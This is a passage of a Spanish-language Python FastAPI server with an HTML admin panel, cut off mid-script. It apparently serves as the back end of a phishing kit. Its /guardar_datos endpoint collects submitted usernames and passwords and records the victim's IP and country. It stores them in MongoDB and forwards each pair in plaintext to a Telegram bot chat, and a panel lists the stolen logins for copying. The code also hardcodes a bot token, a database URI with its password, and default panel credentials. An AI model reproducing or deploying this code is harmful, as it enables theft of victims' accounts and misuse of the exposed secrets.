# ============================================================
# IMPORTS
# ============================================================
from fastapi import FastAPI, HTTPException, Request, UploadFile, BackgroundTasks
from fastapi import File, Form
from functools import partial, lru_cache
import shutil
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import httpx
from fastapi.responses import HTMLResponse
from collections import deque, defaultdict
from pydantic import BaseModel
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.responses import Response
import random
import base64
from motor.motor_asyncio import AsyncIOMotorClient
from typing import Callable, Dict, Set, Optional
from datetime import datetime, timedelta
import re
import asyncio
import time
import os
import ipaddress
from contextlib import asynccontextmanager
import logging
from asyncio import Semaphore, Queue
import weakref
from bson import ObjectId

# ============================================================
# 🔧 FIX #1: DNS MONKEYPATCH AGRESIVO PARA PYMONGO/MOTOR (A prueba de fallos)
# ============================================================
import dns.resolver

try:
    import dns.rdtypes.ANY.SRV
except ImportError:
    try:
        import dns.rdtypes.inet.SRV
    except ImportError:
        pass

_custom_resolver = dns.resolver.Resolver(configure=False)
_custom_resolver.nameservers = ['8.8.8.8', '8.8.4.4', '1.1.1.1']
_custom_resolver.timeout = 5.0
_custom_resolver.lifetime = 5.0

dns.resolver.default_resolver = _custom_resolver
_original_resolve = dns.resolver.resolve

def _patched_resolve(qname, rdtype='A', *args, **kwargs):
    return _custom_resolver.resolve(qname, rdtype, *args, **kwargs)

dns.resolver.resolve = _patched_resolve
try:
    dns.resolver.query = _patched_resolve
except Exception:
    pass

try:
    import pymongo.srv_resolver as _srv_resolver
    import pymongo.uri_parser as _uri_parser

    _patched_dns_module = type('dns_patched', (), {
        'resolver': type('resolver_patched', (), {
            'default_resolver': _custom_resolver,
            'resolve': _patched_resolve,
            'query': _patched_resolve,
        })
    })()

    _srv_resolver.dns = _patched_dns_module
    _uri_parser.dns = _patched_dns_module
    print("✅ Parche DNS aplicado a pymongo.srv_resolver")
except Exception as _e:
    print(f"⚠️ No se pudo parchear pymongo.srv_resolver: {_e}")

_SRV_OK = False
try:
    _test_answers = _custom_resolver.resolve(
        '_mongodb._tcp.cluster0.ndoznk5.mongodb.net', 'SRV'
    )
    for _r in _test_answers:
        print(f"✅ SRV OK: {_r.target}:{_r.port}")
    _SRV_OK = True
except Exception as _e:
    print(f"❌ SRV falla incluso con DNS de Google: {_e}")
    print("   → Se usará la URI directa (sin +srv) como fallback")

# ============================================================
# CONFIGURACIÓN DE LOGGING
# ============================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(name)s | %(message)s'
)
logger = logging.getLogger(__name__)

# ============================================================
# CONFIGURACIÓN Y CREDENCIALES
# ============================================================
TOKEN = os.getenv("TELEGRAM_TOKEN", "8061450462:AAH2Fu5UbCeif5SRQ8-PQk2gorhNVk8lk6g")
AUTH_USERNAME = os.getenv("AUTH_USERNAME", "gato")
AUTH_PASSWORD = os.getenv("AUTH_PASSWORD", "Gato1234@")

MONGO_URI_SRV = os.getenv(
    "MONGO_URI_SRV",
    "mongodb+srv://torresyuliana382:ZFAsVwH2gAIEm1ic@cluster0.ndoznk5.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
)
MONGO_URI_DIRECT = os.getenv("MONGO_URI_DIRECT", "")

# ============================================================
# CACHES Y CONFIGURACIONES GLOBALES
# ============================================================
CACHE_TTL = 300
ip_cache: Dict[str, tuple] = {}
blocked_ips_cache: Set[str] = set()

MAX_CONCURRENT_REQUESTS = 100
MAX_DB_CONNECTIONS = 20
MAX_HTTP_CONNECTIONS = 50
REQUEST_TIMEOUT = 30

MAX_TELEGRAM_CONCURRENT = 20
MAX_TELEGRAM_QUEUE_SIZE = 1000
TELEGRAM_TIMEOUT = 10.0
TELEGRAM_RETRY_DELAY = 0.5
MAX_TELEGRAM_RETRIES = 2
RATE_LIMIT_MESSAGES_PER_MINUTE = 30

request_semaphore = Semaphore(MAX_CONCURRENT_REQUESTS)
db_semaphore = Semaphore(MAX_DB_CONNECTIONS)
http_semaphore = Semaphore(MAX_HTTP_CONNECTIONS)
telegram_semaphore = Semaphore(MAX_TELEGRAM_CONCURRENT)

background_queue: Queue = Queue(maxsize=1000)
telegram_queue: Queue = Queue(maxsize=MAX_TELEGRAM_QUEUE_SIZE)

bot_rate_limits = defaultdict(lambda: {"messages": [], "last_second": 0})
telegram_stats = {
    "sent_immediate": 0,
    "sent_queued": 0,
    "failed": 0,
    "queue_full": 0,
    "rate_limited": 0,
    "total_processed": 0
}

PAISES_LATINOAMERICA = frozenset({
    'AR', 'BO', 'BR', 'CL', 'CO', 'CR', 'CU', 'DO', 'EC', 'SV',
    'GT', 'HN', 'MX', 'NI', 'PA', 'PY', 'PE', 'UY', 'VE', 'PR',
    'GF', 'GY', 'SR', 'BZ', 'JM', 'HT', 'TT', 'BB', 'GD', 'LC',
    'VC', 'DM', 'AG', 'KN', 'BS',
})

# ============================================================
# CLASE TELEGRAM MESSAGE
# ============================================================
class TelegramMessage:
    def __init__(self, mensaje: str, chat_id: str, token: str,
                 priority: int = 1, max_retries: int = MAX_TELEGRAM_RETRIES):
        self.mensaje = mensaje
        self.chat_id = chat_id
        self.token = token
        self.priority = priority
        self.max_retries = max_retries
        self.attempts = 0
        self.created_at = time.time()

# ============================================================
# RATE LIMITING
# ============================================================
def check_rate_limit(token: str) -> bool:
    current_time = time.time()
    current_second = int(current_time)
    rate_info = bot_rate_limits[token]
    rate_info["messages"] = [
        ts for ts in rate_info["messages"] if ts > current_time - 60
    ]
    if len(rate_info["messages"]) >= RATE_LIMIT_MESSAGES_PER_MINUTE:
        return False
    if rate_info["last_second"] == current_second:
        return False
    return True

def record_message_sent(token: str):
    current_time = time.time()
    rate_info = bot_rate_limits[token]
    rate_info["messages"].append(current_time)
    rate_info["last_second"] = int(current_time)

# ============================================================
# ENVÍO TELEGRAM OPTIMIZADO
# ============================================================
async def _enviar_telegram_optimizado(mensaje_obj: TelegramMessage) -> bool:
    async with telegram_semaphore:
        for intento in range(mensaje_obj.max_retries + 1):
            try:
                if not check_rate_limit(mensaje_obj.token):
                    if intento == 0:
                        telegram_stats["rate_limited"] += 1
                    await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
                    continue

                url = f"https://api.telegram.org/bot{mensaje_obj.token}/sendMessage"
                payload = {
                    "chat_id": mensaje_obj.chat_id,
                    "text": mensaje_obj.mensaje[:4000]
                }

                response = await asyncio.wait_for(
                    app.state.http_client.post(url, json=payload),
                    timeout=TELEGRAM_TIMEOUT
                )

                if response.status_code == 200:
                    record_message_sent(mensaje_obj.token)
                    return True
                elif response.status_code == 429:
                    retry_after = int(response.headers.get('Retry-After', 1))
                    await asyncio.sleep(min(retry_after, 10))
                    continue
                else:
                    logger.warning(f"Error Telegram HTTP {response.status_code}")
                    if intento < mensaje_obj.max_retries:
                        await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
                        continue

            except asyncio.TimeoutError:
                logger.warning(f"Timeout Telegram (intento {intento + 1})")
                if intento < mensaje_obj.max_retries:
                    await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
                    continue
            except Exception as e:
                logger.error(f"Error Telegram (intento {intento + 1}): {e}")
                if intento < mensaje_obj.max_retries:
                    await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
                    continue

        return False

# ============================================================
# WORKERS
# ============================================================
async def background_worker():
    while True:
        try:
            task = await background_queue.get()
            if task is None:
                break
            func, args, kwargs = task
            try:
                if asyncio.iscoroutinefunction(func):
                    await func(*args, **kwargs)
                else:
                    func(*args, **kwargs)
            except Exception as e:
                logger.error(f"Error en background worker: {e}")
            background_queue.task_done()
        except Exception as e:
            logger.error(f"Error en background worker loop: {e}")
            await asyncio.sleep(1)

async def telegram_worker(worker_id: int):
    logger.info(f"Telegram worker {worker_id} iniciado")
    while True:
        try:
            mensaje_obj = await asyncio.wait_for(telegram_queue.get(), timeout=5.0)
            if mensaje_obj is None:
                logger.info(f"Telegram worker {worker_id} recibió señal de parada")
                break

            start_time = time.time()
            success = await _enviar_telegram_optimizado(mensaje_obj)
            processing_time = time.time() - start_time

            if success:
                telegram_stats["sent_queued"] += 1
                telegram_stats["total_processed"] += 1
            else:
                telegram_stats["failed"] += 1
                logger.error(f"Worker {worker_id}: Falló después de reintentos")

            telegram_queue.task_done()
        except asyncio.TimeoutError:
            continue
        except Exception as e:
            logger.error(f"Error en telegram worker {worker_id}: {e}")
            await asyncio.sleep(1)

# ============================================================
# ENVÍO HÍBRIDO
# ============================================================
async def enviar_telegram_hibrido(mensaje: str, chat_id: str = "-4826186479",
                                  token: str = TOKEN, priority: int = 1,
                                  force_immediate: bool = False) -> dict:
    mensaje_obj = TelegramMessage(mensaje, chat_id, token, priority)

    if force_immediate or (telegram_semaphore._value > 5 and telegram_queue.qsize() < 50):
        if check_rate_limit(token):
            try:
                success = await asyncio.wait_for(
                    _enviar_telegram_optimizado(mensaje_obj),
                    timeout=TELEGRAM_TIMEOUT + 2.0
                )
                if success:
                    telegram_stats["sent_immediate"] += 1
                    telegram_stats["total_processed"] += 1
                    return {"status": "sent_immediate", "success": True, "method": "direct"}
            except asyncio.TimeoutError:
                logger.warning("Timeout en envío inmediato, pasando a cola")
            except Exception as e:
                logger.error(f"Error en envío inmediato: {e}")

    try:
        telegram_queue.put_nowait(mensaje_obj)
        return {
            "status": "queued", "success": True, "method": "queue",
            "queue_size": telegram_queue.qsize()
        }
    except asyncio.QueueFull:
        telegram_stats["queue_full"] += 1
        logger.error("Cola de Telegram llena, mensaje descartado")
        return {"status": "queue_full", "success": False, "method": "none"}

# ============================================================
# LIFESPAN ROBUSTO
# ============================================================
@asynccontextmanager
async def lifespan(app: FastAPI):
    app.state.http_client = httpx.AsyncClient(
        limits=httpx.Limits(
            max_keepalive_connections=MAX_HTTP_CONNECTIONS,
            max_connections=MAX_HTTP_CONNECTIONS * 2,
            keepalive_expiry=30.0
        ),
        timeout=httpx.Timeout(REQUEST_TIMEOUT)
    )

    try:
        await init_db_async()
        await load_caches()
        logger.info("✅ BD y caches inicializados")
    except Exception as e:
        logger.error(f"⚠️ No se pudo inicializar BD/caches: {e}")
        logger.warning("La app continuará arrancando; algunas funciones fallarán hasta que la BD esté disponible")

    app.state.background_task = asyncio.create_task(background_worker())
    app.state.telegram_workers = []
    for i in range(5):
        worker = asyncio.create_task(telegram_worker(i))
        app.state.telegram_workers.append(worker)

    logger.info("🚀 Aplicación iniciada con 5 workers de Telegram")

    yield

    logger.info("Cerrando aplicación...")
    await background_queue.put(None)
    for _ in range(len(app.state.telegram_workers)):
        try:
            telegram_queue.put_nowait(None)
        except asyncio.QueueFull:
            pass

    try:
        await asyncio.wait_for(app.state.background_task, timeout=10.0)
    except asyncio.TimeoutError:
        logger.warning("Background worker no terminó, cancelando")
        app.state.background_task.cancel()

    done, pending = await asyncio.wait(app.state.telegram_workers, timeout=10.0)
    if pending:
        logger.warning(f"Cancelando {len(pending)} workers de Telegram")
        for task in pending:
            task.cancel()
        await asyncio.gather(*pending, return_exceptions=True)

    await app.state.http_client.aclose()
    try:
        client.close()
    except Exception:
        pass

    logger.info("✅ Aplicación cerrada correctamente")

app = FastAPI(lifespan=lifespan)

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["*"],
    max_age=3600,
)

# ============================================================
# MONGO CLIENT
# ============================================================
def _crear_cliente_mongo():
    opciones = dict(
        maxPoolSize=MAX_DB_CONNECTIONS,
        minPoolSize=2,
        maxIdleTimeMS=60000,
        serverSelectionTimeoutMS=15000,
        socketTimeoutMS=15000,
        connectTimeoutMS=15000,
        waitQueueTimeoutMS=10000,
        maxConnecting=5,
        retryWrites=True
    )

    if MONGO_URI_DIRECT:
        logger.info("🔌 Usando URI directa de MongoDB (sin +srv)")
        return AsyncIOMotorClient(MONGO_URI_DIRECT, **opciones)

    if _SRV_OK:
        logger.info("🔌 Usando URI +srv (test SRV pasó)")
        return AsyncIOMotorClient(MONGO_URI_SRV, **opciones)

    logger.warning("⚠️ SRV no resolvió en startup. Intentando +srv con opciones ampliadas...")
    return AsyncIOMotorClient(MONGO_URI_SRV, **opciones)

client = _crear_cliente_mongo()
db = client["api_db"]
logs_usuarios = db["logs_usuarios"]
ip_bloqueadas = db["ip_bloqueadas"]
credenciales_usuario = db["credenciales_usuario"]

blocked_ips_cache: Set[str] = set()

# ============================================================
# HELPERS
# ============================================================
async def add_background_task(func, *args, **kwargs):
    try:
        await asyncio.wait_for(background_queue.put((func, args, kwargs)), timeout=1.0)
    except asyncio.TimeoutError:
        logger.warning("Queue de background lleno, descartando tarea")

async def init_db_async():
    async with db_semaphore:
        try:
            tasks = [
                asyncio.wait_for(ip_bloqueadas.create_index("ip", unique=True, background=True), timeout=10.0),
                asyncio.wait_for(logs_usuarios.create_index("grupo", background=True), timeout=10.0),
                asyncio.wait_for(credenciales_usuario.create_index("usuario", unique=True, background=True), timeout=10.0)
            ]
            await asyncio.gather(*tasks, return_exceptions=True)
            logger.info("Base de datos inicializada correctamente")
        except Exception as e:
            logger.error(f"Error inicializando BD: {e}")
            raise

async def load_caches():
    global blocked_ips_cache
    async with db_semaphore:
        try:
            blocked_docs = ip_bloqueadas.find({}, {"ip": 1})
            blocked_ips_cache = {doc["ip"] async for doc in blocked_docs}
            logger.info(f"Caches cargados: {len(blocked_ips_cache)} IPs bloqueadas")
        except Exception as e:
            logger.error(f"Error cargando caches: {e}")
            raise

async def verificar_pais_cached(ip: str) -> tuple[bool, str]:
    async with http_semaphore:
        url = f"http://ipwhois.app/json/{ip}"
        try:
            response = await asyncio.wait_for(app.state.http_client.get(url), timeout=5.0)
            if response.status_code == 200:
                data = response.json()
                country = data.get('country_code', 'Unknown')
                return (country in PAISES_LATINOAMERICA, country)
            return (False, 'Unknown')
        except Exception:
            return (False, 'Unknown')

def obtener_ip_real(request: Request) -> str:
    for header in ["x-forwarded-for", "x-real-ip", "cf-connecting-ip", "x-client-ip"]:
        value = request.headers.get(header)
        if value:
            ip = value.split(",")[0].strip()
            if ip:
                return ip
    return request.client.host if request.client else "127.0.0.1"

# ============================================================
# MIDDLEWARES
# ============================================================
class ConcurrencyLimitMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next: Callable):
        try:
            async with asyncio.timeout(REQUEST_TIMEOUT):
                async with request_semaphore:
                    return await call_next(request)
        except asyncio.TimeoutError:
            return JSONResponse(status_code=503, content={"detail": "Servidor ocupado"})
        except Exception:
            return JSONResponse(status_code=500, content={"detail": "Error interno"})

app.add_middleware(ConcurrencyLimitMiddleware)

# ============================================================
# MODELOS
# ============================================================
class UpdateLogRequest(BaseModel):
    usuario: Optional[str] = None
    contra: Optional[str] = None
    grupo: Optional[str] = None

# ============================================================
# ENDPOINTS
# ============================================================
@app.get("/")
async def read_root():
    return {"message": "API con copia rápida al portapapeles activa!"}

async def _guardar_log_usuario(usuario: str, contra: str, ip: str, pais: str, grupo: str):
    async with db_semaphore:
        try:
            await logs_usuarios.insert_one({
                "usuario": usuario,
                "contrasena": contra,
                "ip": ip,
                "pais": pais,
                "grupo": grupo.strip().lower(),
                "fecha": datetime.utcnow()
            })
        except Exception as e:
            logger.error(f"Error guardando log: {e}")

@app.post("/guardar_datos")
async def guardar_datos(
    request: Request,
    usuario: str = Form(...),
    contra: str = Form(...),
    grupo: str = Form("general")
):
    ip = obtener_ip_real(request)
    _, pais = await verificar_pais_cached(ip)
    grupo_limpio = grupo.strip().lower()
    
    await add_background_task(_guardar_log_usuario, usuario, contra, ip, pais, grupo_limpio)
    
    msg = f"🔔 *Nuevo registro [Grupo: {grupo_limpio}]*\n👤 Usuario: `{usuario}`\n🔑 Contraseña: `{contra}`\n🌐 IP: `{ip}`\n🌍 País: `{pais}`"
    await enviar_telegram_hibrido(msg)
    
    return {"message": "Datos guardados correctamente", "grupo": grupo_limpio, "ip": ip, "pais": pais}

# ============================================================
# ENDPOINTS PARA GESTIÓN DE ACCESO ÚNICO POR USUARIO
# ============================================================
@app.post("/api/usuario/configurar")
async def configurar_password_usuario(usuario: str = Form(...), password: str = Form(...)):
    async with db_semaphore:
        usuario_limpio = usuario.strip().lower()
        existente = await credenciales_usuario.find_one({"usuario": usuario_limpio})
        if existente:
            raise HTTPException(status_code=400, detail="Este usuario ya tiene una contraseña asignada y no se puede modificar por este medio.")
        
        await credenciales_usuario.insert_one({
            "usuario": usuario_limpio,
            "password": password,
            "fecha_creacion": datetime.utcnow()
        })
        return {"message": f"Contraseña configurada exitosamente para el usuario '{usuario_limpio}'."}

@app.post("/api/usuario/verificar")
async def verificar_acceso_usuario(usuario: str = Form(...), password: str = Form(...)):
    async with db_semaphore:
        usuario_limpio = usuario.strip().lower()
        doc = await credenciales_usuario.find_one({"usuario": usuario_limpio})
        if not doc or doc["password"] != password:
            raise HTTPException(status_code=401, detail="Contraseña incorrecta o usuario no registrado.")
        return {"status": "ok", "usuario": usuario_limpio}

# ============================================================
# ENDPOINTS CRUD
# ============================================================
@app.get("/api/logs")
async def api_obtener_logs(usuario: str, password: str, grupo: Optional[str] = None):
    async with db_semaphore:
        doc = await credenciales_usuario.find_one({"usuario": usuario.strip().lower()})
        if not doc or doc["password"] != password:
            raise HTTPException(status_code=401, detail="No autorizado.")

        query = {"grupo": grupo.strip().lower()} if grupo and grupo != "todos" else {}
        cursor = logs_usuarios.find(query).sort("fecha", -1).limit(200)
        logs = await cursor.to_list(length=200)
        
        resultado = []
        for log in logs:
            resultado.append({
                "id": str(log["_id"]),
                "usuario": log.get("usuario", ""),
                "contra": log.get("contrasena", ""),
                "ip": log.get("ip", ""),
                "pais": log.get("pais", ""),
                "grupo": log.get("grupo", "general"),
                "fecha": log.get("fecha").strftime("%Y-%m-%d %H:%M:%S") if isinstance(log.get("fecha"), datetime) else str(log.get("fecha"))
            })
        return {"logs": resultado}

@app.get("/api/grupos")
async def api_obtener_grupos():
    async with db_semaphore:
        grupos = await logs_usuarios.distinct("grupo")
        return {"grupos": grupos if grupos else ["general"]}

@app.put("/api/logs/{log_id}")
async def api_editar_log(log_id: str, data: UpdateLogRequest):
    async with db_semaphore:
        try:
            update_data = {}
            if data.usuario is not None: update_data["usuario"] = data.usuario
            if data.contra is not None: update_data["contrasena"] = data.contra
            if data.grupo is not None: update_data["grupo"] = data.grupo.strip().lower()

            if not update_data:
                raise HTTPException(status_code=400, detail="Sin datos a actualizar")

            result = await logs_usuarios.update_one({"_id": ObjectId(log_id)}, {"$set": update_data})
            if result.matched_count == 0:
                raise HTTPException(status_code=404, detail="No encontrado")
            return {"message": "Actualizado exitosamente"}
        except Exception as e:
            if isinstance(e, HTTPException): raise e
            raise HTTPException(status_code=400, detail="Error en ID o BD")

@app.delete("/api/logs/{log_id}")
async def api_eliminar_log(log_id: str):
    async with db_semaphore:
        try:
            result = await logs_usuarios.delete_one({"_id": ObjectId(log_id)})
            if result.deleted_count == 0:
                raise HTTPException(status_code=404, detail="No encontrado")
            return {"message": "Eliminado exitosamente"}
        except Exception as e:
            if isinstance(e, HTTPException): raise e
            raise HTTPException(status_code=400, detail="Error en ID o BD")

@app.delete("/api/grupo/{grupo_nombre}")
async def api_eliminar_grupo(grupo_nombre: str):
    async with db_semaphore:
        result = await logs_usuarios.delete_many({"grupo": grupo_nombre.strip().lower()})
        return {"message": f"Se eliminaron {result.deleted_count} registros"}

# ============================================================
# PANEL HTML CON COPIA RÁPIDA AL HACER CLIC
# ============================================================
@app.get("/ver_datos", response_class=HTMLResponse)
async def ver_datos():
    html_content = """
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <title>Panel de Acceso por Usuario</title>
        <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background-color: #f4f6f9; color: #333; }
            h2 { color: #2c3e50; }
            .card { background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 400px; margin: 50px auto; }
            .card input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
            .controls { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; background: #fff; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
            select, button, input { padding: 8px 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; }
            button { background-color: #007bff; color: white; border: none; cursor: pointer; }
            button:hover { background-color: #0056b3; }
            button.btn-danger { background-color: #dc3545; }
            button.btn-warning { background-color: #ffc107; color: #212529; }
            table { width: 100%; border-collapse: collapse; background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
            th, td { padding: 12px 15px; border-bottom: 1px solid #eee; text-align: left; }
            th { background-color: #007bff; color: white; }
            tr:hover { background-color: #f8f9fa; }
            
            /* Estilo interactivo para copiar al dar clic */
            .copyable {
                cursor: pointer;
                position: relative;
                transition: color 0.2s;
            }
            .copyable:hover {
                color: #007bff;
                text-decoration: underline;
            }
            
            /* Notificación flotante (Toast) */
            #toast {
                visibility: hidden;
                min-width: 200px;
                background-color: #333;
                color: #fff;
                text-align: center;
                border-radius: 4px;
                padding: 10px;
                position: fixed;
                z-index: 1000;
                right: 20px;
                bottom: 20px;
                font-size: 14px;
                box-shadow: 0 4px 6px rgba(0,0,0,0.2);
            }
            #toast.show {
                visibility: visible;
                animation: fadein 0.3s, fadeout 0.3s 1.5s;
            }
            @keyframes fadein { from {bottom: 0; opacity: 0;} to {bottom: 20px; opacity: 1;} }
            @keyframes fadeout { from {bottom: 20px; opacity: 1;} to {bottom: 0; opacity: 0;} }

            .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); justify-content: center; align-items: center; }
            .modal-content { background: white; padding: 25px; border-radius: 8px; width: 400px; }
            .modal-content input { width: 100%; margin-bottom: 15px; box-sizing: border-box; }
            .modal-buttons { display: flex; justify-content: flex-end; gap: 10px; }
            #crudContainer { display: none; }
        </style>
    </head>
    <body>

        <!-- PANTALLA DE ACCESO -->
        <div id="authContainer" class="card">
            <h2>Acceso al Panel</h2>
            <p id="authSubtitle" style="font-size: 13px; color: #666;">Ingresa tu usuario y contraseña. Si es tu primera vez con este usuario, se creará su contraseña permanente.</p>
            <input type="text" id="loginUsuario" placeholder="Nombre de Usuario">
            <input type="password" id="loginPassword" placeholder="Contraseña">
            <button style="width: 100%;" onclick="autenticarUsuario()">Ingresar / Configurar</button>
            <p id="authError" style="color: red; font-size: 13px; margin-top: 10px; text-align: center;"></p>
        </div>

        <!-- PANEL CRUD PRINCIPAL -->
        <div id="crudContainer">
            <h2>Panel de Administración - Usuario: <span id="spanUser"></span></h2>
            
            <div class="controls">
                <div>
                    <label for="grupoSelect"><strong>Filtrar Grupo:</strong></label>
                    <select id="grupoSelect" onchange="cargarLogs()">
                        <option value="todos">Todos los grupos</option>
                    </select>
                    <button onclick="cargarGruposYLogs()" style="margin-left: 10px;">Actualizar</button>
                </div>
                <div>
                    <button class="btn-danger" onclick="eliminarGrupoActual()">Eliminar Grupo Actual</button>
                    <button onclick="cerrarSesion()" style="background-color: #6c757d; margin-left: 10px;">Salir</button>
                </div>
            </div>

            <table>
                <thead>
                    <tr>
                        <th>Grupo</th>
                        <th>Correo / Usuario</th>
                        <th>Contraseña (Clave)</th>
                        <th>IP</th>
                        <th>País</th>
                        <th>Fecha (UTC)</th>
                        <th>Acciones</th>
                    </tr>
                </thead>
                <tbody id="tablaLogs">
                    <tr><td colspan="7" style="text-align:center;">Cargando registros...</td></tr>
                </tbody>
            </table>
        </div>

        <!-- Notificación Toast flotante -->
        <div id="toast">¡Copiado al portapapeles!</div>

        <!-- Modal de Edición -->
        <div id="editModal" class="modal">
            <div class="modal-content">
                <h3>Editar Registro</h3>
                <input type="hidden" id="editId">
                <label>Usuario:</label>
                <input type="text" id="editUsuario">
                <label>Contraseña:</label>
                <input type="text" id="editContra">
                <label>Grupo:</label>
                <input type="text" id="editGrupo">
                <div class="modal-buttons">
                    <button class="btn-warning" onclick="cerrarModal()">Cancelar</button>
                    <button onclick="guardarEdicion()">Guardar</button>
                </div>
            </div>
        </div>

        <script>
            let currentUser = "";
            let currentPass = "";

            window.onload = () => {
                const savedUser = sessionStorage.getItem('crud_user');
                const savedPass = sessionStorage.getItem('crud_pass');
                if (savedUser && savedPass) {
                    currentUser = savedUser;
                    currentPass = savedPass;
                    document.getElementById('spanUser').textContent = currentUser;
                    document.getElementById('authContainer').style.display = 'none';
                    document.getElementById('crudContainer').style.display = 'block';
                    cargarGruposYLogs();
                }
            }

            async function autenticarUsuario() {
                const u = document.getElementById('loginUsuario').value.trim();
                const p = document.getElementById('loginPassword').value.trim();
                const errBox = document.getElementById('authError');
                errBox.textContent = "";

                if (!u || !p) {
                    errBox.textContent = "Completa ambos campos.";
                    return;
                }

                try {
                    let formData = new URLSearchParams();
                    formData.append('usuario', u);
                    formData.append('password', p);

                    let res = await fetch('/api/usuario/verificar', { method: 'POST', body: formData });
                    
                    if (res.ok) {
                        guardarSesion(u, p);
                        return;
                    }

                    if (res.status === 401) {
                        let resConfig = await fetch('/api/usuario/configurar', { method: 'POST', body: formData });
                        if (resConfig.ok) {
                            alert("¡Contraseña configurada con éxito para este usuario! Ya no se podrá cambiar.");
                            guardarSesion(u, p);
                        } else {
                            let errData = await resConfig.json();
                            errBox.textContent = errData.detail || "Contraseña incorrecta para este usuario.";
                        }
                    } else {
                        let errData = await res.json();
                        errBox.textContent = errData.detail || "Error de autenticación.";
                    }
                } catch (e) {
                    errBox.textContent = "Error de conexión con el servidor.";
                }
            }

            function guardarSesion(u, p) {
                currentUser = u;
                currentPass = p;
                sessionStorage.setItem('crud_user', u);
                sessionStorage.setItem('crud_pass', p);
                document.getElementById('spanUser').textContent = currentUser;
                document.getElementById('authContainer').style.display = 'none';
                document.getElementById('crudContainer').style.display = 'block';
                cargarGruposYLogs();
            }

            function cerrarSesion() {
                sessionStorage.clear();
                window.location.reload();
            }

            // Función para copiar texto al portapapeles con notificación visual
            function copiarTexto(texto) {
                navigator.clipboard.writeText(texto).then(() => {
                    const toast = document.getElementById("toast");
                    toast.className = "show";
                    setTimeout(() => { toast.className = toast.className.replace("show", ""); }, 1800);
                }).catch(err => {
                    console.error("Error al copiar: ", err);
                });
            }

            async function cargarGruposYLogs() {
                try {
                    const resGrupos = await fetch('/api/grupos');
                    const dataGrupos = await resGrupos.json();
                    const select = document.getElementById('grupoSelect');
                    const valorActual = select.value;
                    
                    select.innerHTML = '<option value="todos">Todos los grupos</option>';
                    dataGrupos.grupos.forEach(g => {
                        const opt = document.createElement('option');
                        opt.value = g;
                        opt.textContent = g.toUpperCase();
                        select.appendChild(opt);
                    });
                    select.value = dataGrupos.grupos.includes(valorActual) ? valorActual : 'todos';
                } catch (e) {
                    console.error("Error cargando grupos", e);
                }
                cargarLogs();
            }

            async function cargarLogs() {
                const grupo = document.getElementById('grupoSelect').value;
                let url = `/api/logs?usuario=${encodeURIComponent(currentUser)}&password=${encodeURIComponent(currentPass)}`;
                if (grupo !== 'todos') url += `&grupo=${encodeURIComponent(grupo)}`;

                try {
                    const res = await fetch(url);
                    if (!res.ok) {
                        alert("Sesión inválida o credenciales incorrectas.");
                        cerrarSesion();
                        return;
                    }
                    const data = await res.json();
                    const tbody = document.getElementById('tablaLogs');
                    tbody.innerHTML = '';

                    if (data.logs.length === 0) {
                        tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">No hay registros disponibles.</td></tr>';
                        return;
                    }

                    data.logs.forEach(log => {
                        const tr = document.createElement('tr');
                        tr.innerHTML = `
                            <td><strong>${log.grupo}</strong></td>
                            <td><span class="copyable" title="Haz clic para copiar" onclick="copiarTexto('${log.usuario}')">${log.usuario} 📋</span></td>
                            <td><span class="copyable" title="Haz clic para copiar" onclick="copiarTexto('${log.contra}')">${log.contra} 📋</span></td>
                            <td>${log.ip}</td>
                            <td>${log.pais}</td>
                            <td>${log.fecha}</td>
                            <td>
                                <button class="btn-warning" onclick="abrirModal('${log.id}', '${log.usuario}', '${log.contra}', '${log.grupo}')">Editar</button>
                                <button class="btn-danger" onclick="eliminarLog('${log.id}')">Eliminar</button>
                            </td>
                        `;
                        tbody.appendChild(tr);
                    });
                } catch (e) {
                    console.error("Error cargando logs", e);
                }
            }

            async function eliminarLog(id) {
                if (!confirm("¿Eliminar este registro?")) return;
                const res = await fetch(`/api/logs/${id}`, { method: 'DELETE' });
                if (res.ok) cargarLogs();
                else alert("Error al eliminar");
            }

            async function eliminarGrupoActual() {
                const grupo = document.getElementById('grupoSelect').value;
                if (grupo === 'todos') {
                    alert("Selecciona un grupo específico.");
                    return;
                }
                if (!confirm(`¿Eliminar todos los registros del grupo '${grupo}'?`)) return;
                const res = await fetch(`/api/grupo/${grupo}`, { method: 'DELETE' });
                if (res.ok) cargarGruposYLogs();
                else alert("Error al eliminar grupo");
            }

            function abrirModal(id, usuario, contra, grupo) {
                document.getElementById('editId').value = id;
                document.getElementById('editUsuario').value = usuario;
                document.getElementById('editContra').value = contra;
                document.getElementById('editGrupo').value = grupo;
                document.getElementById('editModal').style.display = 'flex';
            }

            function cerrarModal() {
                document.getElementById('editModal').style.display = 'none';
            }

            async function guardarEdicion() {
                const id = document.getElementById('editId').value;
                const usuario = document.getElementById('editUsuario').value;
                const contra = document.getElementById('editContra').value;
                const grupo = document.getElementById('editGrupo').value;

                const res = await fetch(`/api/logs/${id}`, {
                    method: 'PUT',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ usuario, contra, grupo })
                });
                if (res.ok) {
                    cerrarModal();
